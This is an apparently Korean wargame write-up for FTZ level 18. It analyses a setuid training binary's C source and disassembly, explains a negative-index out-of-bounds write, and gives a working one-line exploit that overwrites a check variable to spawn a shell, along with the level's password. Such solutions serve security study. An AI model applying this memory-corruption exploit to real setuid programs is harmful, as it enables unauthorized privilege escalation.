---
sort: 18
---

# Level 18

```note
id : level18

password : why did you do it
```

hint를 보면 attackme의 소스코드가 나온다.<br>
attackme에 setuid가 걸려있으니 얘를 조져보자.

```c
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
void shellout(void);
int main()
{
  char string[100];
  int check;
  int x = 0;
  int count = 0;
  fd_set fds;
  printf("Enter your command: ");
  fflush(stdout);
  while(1)
    {
      if(count >= 100)
        printf("what are you trying to do?\n");
      if(check == 0xdeadbeef)
        shellout();
      else
        {
          FD_ZERO(&fds);
          FD_SET(STDIN_FILENO,&fds);
 
          if(select(FD_SETSIZE, &fds, NULL, NULL, NULL) >= 1)
            {
              if(FD_ISSET(fileno(stdin),&fds))
                {
                  read(fileno(stdin),&x,1);
                  switch(x)
                    {
                      case '\r':
                      case '\n':
                        printf("\a");
                        break;
                      case 0x08:
                        count--;
                        printf("\b \b");
                        break;
                      default:
                        string[count] = x;
                        count++;
                        break;
                    }
                }
            }
        }
    }
}
 
void shellout(void)
{
  setreuid(3099,3099);
  execl("/bin/sh","sh",NULL);
}
```

input값을 1byte씩 읽어서 count값을 줄이거나 input을 write하거나 할 수 있다.<br>
count값이 음수일 때도 c언어에서는 음수값에 따른 indexing을 수행해버리기 때문에 Out Of Boundary가 발생할 수 있다.<br>
string, check 등 지역변수의 위치를 파악한다면 충분히 check값을 바꿀 수 있을 것이다.

<pre>
(gdb) disas main
Dump of assembler code for function main:
0x08048550 (main+0):	push   %ebp
0x08048551 (main+1):	mov    %esp,%ebp
0x08048553 (main+3):	sub    $0x100,%esp
0x08048559 (main+9):	push   %edi

... (중략) ...

<b># if(check == 0xdeadbeef)
0x080485ab (main+91):	cmpl   $0xdeadbeef,0xffffff98(%ebp) # check
0x080485b2 (main+98):	jne    0x80485c0 (main+112)
0x080485b4 (main+100):	call   0x8048780 (shellout) </b>

... (중략) ...

<b># default:
0x08048743 (main+499):	lea    0xffffff9c(%ebp),%eax # string
0x08048746 (main+502):	mov    %eax,0xffffff04(%ebp)
0x0804874c (main+508):	mov    0xffffff90(%ebp),%edx # count
0x0804874f (main+511):	mov    0xffffff94(%ebp),%cl # x
0x08048752 (main+514):	mov    %cl,0xffffff03(%ebp)
0x08048758 (main+520):	mov    0xffffff03(%ebp),%al
0x0804875e (main+526):	mov    0xffffff04(%ebp),%ecx
0x08048764 (main+532):	mov    %al,(%edx,%ecx,1)        # string[count] = x;
0x08048767 (main+535):	incl   0xffffff90(%ebp)         # count++;
0x0804876a (main+538):	jmp    0x8048770 (main+544) </b>

0x0804876c (main+540):	lea    0x0(%esi,1),%esi
0x08048770 (main+544):	jmp    0x8048591 (main+65)
0x08048775 (main+549):	lea    0xfffffef4(%ebp),%esp
0x0804877b (main+555):	pop    %ebx
0x0804877c (main+556):	pop    %esi
0x0804877d (main+557):	pop    %edi
0x0804877e (main+558):	leave  
0x0804877f (main+559):	ret
</pre>

check 변수를 확인하는 부분, switch문의 default문을 살펴보면 지역변수들의 위치를 모두 파악할 수 있다.<br>
각각의 지역변수들의 위치는 아래와 같고, check는 string 바로 위에 붙어있는 것을 알 수 있다.

```
count = ebp - 0x70
x = ebp - 0x6c
check = ebp - 0x68
string = ebp - 0x64
```

```bash
[level18@ftz level18]$ (python -c "print('\x08'*4+'\xef\xbe\xad\xde\n')";cat) | ./attackme 
Enter your command: my-pass
```

```tip
## 알게 된 점

Out Of Boundary (OOB)
```